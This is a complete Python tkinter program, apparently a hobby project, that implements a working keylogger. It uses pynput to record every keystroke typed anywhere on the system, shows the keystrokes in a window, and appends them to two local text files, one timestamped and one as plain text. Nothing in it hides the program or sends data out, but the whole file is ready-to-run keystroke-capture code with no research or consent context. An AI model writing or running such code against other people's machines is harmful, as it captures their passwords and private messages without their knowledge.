import tkinter as tk
from tkinter import ttk, scrolledtext
from pynput.keyboard import Listener, Key
import threading
import datetime

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Application")
        self.root.geometry("600x400")
        self.root.configure(bg="#2c3e50")
        
        # Styling
        style = ttk.Style()
        style.configure("Custom.TButton", 
                        padding=10, 
                        font=('Helvetica', 10, 'bold'))
        
        # Variables
        self.is_logging = False
        self.listener = None
        self.log_file = None
        self.single_line_log_file = None
        
        # Create GUI elements
        self.create_widgets()
        
    def create_widgets(self):
        # Title
        title_label = tk.Label(self.root, 
                               text="Secure Keylogger Monitor", 
                               font=("Helvetica", 16, "bold"),
                               bg="#2c3e50",
                               fg="white")
        title_label.pack(pady=10)
        
        # Status frame
        status_frame = tk.Frame(self.root, bg="#2c3e50")
        status_frame.pack(fill=tk.X, padx=20)
        
        self.status_label = tk.Label(status_frame, 
                                     text="Status: Stopped", 
                                     font=("Helvetica", 10),
                                     bg="#2c3e50",
                                     fg="#e74c3c")
        self.status_label.pack(side=tk.LEFT, pady=5)
        
        # Buttons frame
        button_frame = tk.Frame(self.root, bg="#2c3e50")
        button_frame.pack(pady=10)
        
        self.start_button = ttk.Button(button_frame, 
                                       text="Start Logging",
                                       style="Custom.TButton",
                                       command=self.start_logging)
        self.start_button.pack(side=tk.LEFT, padx=5)
        
        self.stop_button = ttk.Button(button_frame, 
                                      text="Stop Logging",
                                      style="Custom.TButton",
                                      command=self.stop_logging,
                                      state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)
        
        self.clear_button = ttk.Button(button_frame, 
                                       text="Clear Log",
                                       style="Custom.TButton",
                                       command=self.clear_log)
        self.clear_button.pack(side=tk.LEFT, padx=5)
        
        # Log display
        log_frame = tk.Frame(self.root, bg="#2c3e50")
        log_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        log_label = tk.Label(log_frame, 
                             text="Keystroke Log:", 
                             font=("Helvetica", 10),
                             bg="#2c3e50",
                             fg="white")
        log_label.pack(anchor=tk.W)
        
        self.log_display = scrolledtext.ScrolledText(log_frame, 
                                                     height=10,
                                                     font=("Courier", 10),
                                                     bg="#34495e",
                                                     fg="#ecf0f1")
        self.log_display.pack(fill=tk.BOTH, expand=True)
        
    def write_to_log(self, key):
        try:
            letter = key.char
        except AttributeError:
            if key == Key.space:
                letter = ' '
            elif key == Key.enter:
                letter = '\n'
            elif key == Key.backspace:
                letter = '[BACKSPACE]'
            elif key == Key.tab:
                letter = '[TAB]'
            elif key == Key.esc:
                letter = '[ESC]'
            else:
                letter = f'[{str(key)}]'
                
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {letter}"
        
        # Update GUI
        self.root.after(0, self.update_log_display, log_entry)
        
        # Write to file with timestamp
        if self.log_file:
            self.log_file.write(log_entry + "\n")
            self.log_file.flush()  # Ensure data is written to disk
        
        # Write to single line log file without timestamp
        if self.single_line_log_file:
            self.single_line_log_file.write(letter)
            self.single_line_log_file.flush()  # Ensure data is written to disk
        
        return True
    
    def update_log_display(self, text):
        self.log_display.insert(tk.END, text + "\n")
        self.log_display.see(tk.END)
    
    def start_logging(self):
        if not self.is_logging:
            self.is_logging = True
            self.status_label.config(text="Status: Running", fg="#2ecc71")
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            
            # Open log files
            self.log_file = open("multi_ligne_log.txt", 'a', encoding='utf-8')
            self.single_line_log_file = open("single_line_log.txt", 'a', encoding='utf-8')
            
            # Start listener in a separate thread
            self.listener = Listener(on_press=self.write_to_log)
            self.listener_thread = threading.Thread(target=self.listener.start)
            self.listener_thread.daemon = True  # Ensure thread exits when main program exits
            self.listener_thread.start()
    
    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            self.status_label.config(text="Status: Stopped", fg="#e74c3c")
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            
            # Stop listener
            if self.listener:
                self.listener.stop()
                self.listener_thread.join()  # Wait for the listener thread to finish
            
            # Close log files
            if self.log_file:
                self.log_file.close()
                self.log_file = None
            if self.single_line_log_file:
                self.single_line_log_file.close()
                self.single_line_log_file = None
    
    def clear_log(self):
        self.log_display.delete(1.0, tk.END)
        if self.log_file:
            self.log_file.close()
            self.log_file = open("multi_ligne_log.txt", 'w', encoding='utf-8')
        else:
            with open("multi_ligne_log.txt", 'w', encoding='utf-8') as f:
                f.write("")
        
        if self.single_line_log_file:
            self.single_line_log_file.close()
            self.single_line_log_file = open("single_line_log.txt", 'w', encoding='utf-8')
        else:
            with open("single_line_log.txt", 'w', encoding='utf-8') as f:
                f.write("")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()